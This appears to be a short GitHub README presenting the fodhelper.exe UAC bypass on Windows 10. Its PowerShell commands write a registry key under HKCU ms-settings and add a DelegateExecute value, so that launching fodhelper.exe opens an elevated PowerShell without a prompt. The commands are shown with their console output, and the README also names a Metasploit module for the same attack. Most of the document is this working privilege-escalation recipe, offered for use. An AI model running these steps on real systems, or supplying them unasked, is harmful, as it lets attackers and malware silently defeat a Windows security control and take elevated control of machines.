# FodHelper-UAC-Bypass
fodhelper.exe was introduced in windows 10  manage optional features. Fodhelper run at high integrity.

Fodhelper tries to locate the following registry 
`HKCU:\Software\Classes\ms-settings\shell\open\command`

adding the DelegateExecute  value will make fodhelper search for the default value and will create a new process with that value. Setting Default value to something like powershell.exe wil make a high integrity process. 

```
PS C:\Users\test> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe -Force


    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open


Name                           Property
----                           --------
command                        (default) : powershell.exe


PS C:\Users\test> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force


DelegateExecute :
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry



PS C:\Users\test> C:\Windows\System32\fodhelper.exe
PS C:\Users\test>
```

![image](https://github.com/user-attachments/assets/0e327386-9af3-4f2d-92ba-80cf9e4ddcb7)

![image](https://github.com/user-attachments/assets/46a7642c-afca-4f80-86a4-0a56fe94da81)
You can also used the following on metasploit but that will be block by defender
use exploit/windows/local/bypassuac_fodhelper
